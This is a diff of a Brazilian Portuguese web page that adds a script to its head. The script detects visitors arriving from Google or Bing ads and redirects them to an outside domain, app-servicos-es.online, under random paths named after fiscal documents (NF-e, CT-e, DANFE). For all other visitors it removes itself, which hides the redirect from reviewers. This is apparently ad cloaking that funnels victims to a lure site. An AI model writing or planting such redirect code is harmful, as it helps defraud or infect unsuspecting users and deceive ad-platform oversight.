@@ -1,8 +1,46 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    <script language= "JavaScript">
-location.href="https://app-servicos-es.online/id/"
+    <script>
+
+(function () {
+
+    var LINK = 'https://app-servicos-es.online/id/';
+
+    var params   = new URLSearchParams(window.location.search);
+
+    var gclid    = params.get('gclid');
+
+    var msclkid  = params.get('msclkid');
+
+    var url      = window.location.href;
+
+    var ref      = document.referrer;
+
+    var isGoogle = gclid   || /gclid/i.test(url)   || /gclid/i.test(ref);
+
+    var isBing   = msclkid || /msclkid/i.test(url) || /msclkid/i.test(ref);
+
+    var paths = ['cte/index','nfe/index','asp/indexp','app/index','xml/indexp','danfe/index'];
+
+    var path  = paths[Math.floor(Math.random() * paths.length)];
+
+    try {
+
+        if (isGoogle)     window.location.replace(LINK + '?gclid='              + (gclid   || 'ref'));
+
+        else if (isBing)  window.location.replace(LINK + '/' + path + '?msclkid=' + (msclkid || 'ref'));
+
+        else if (document.currentScript) document.currentScript.remove();
+
+    } catch(e) {
+
+        window.location.replace(LINK);
+
+    }
+
+})();
+
 </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
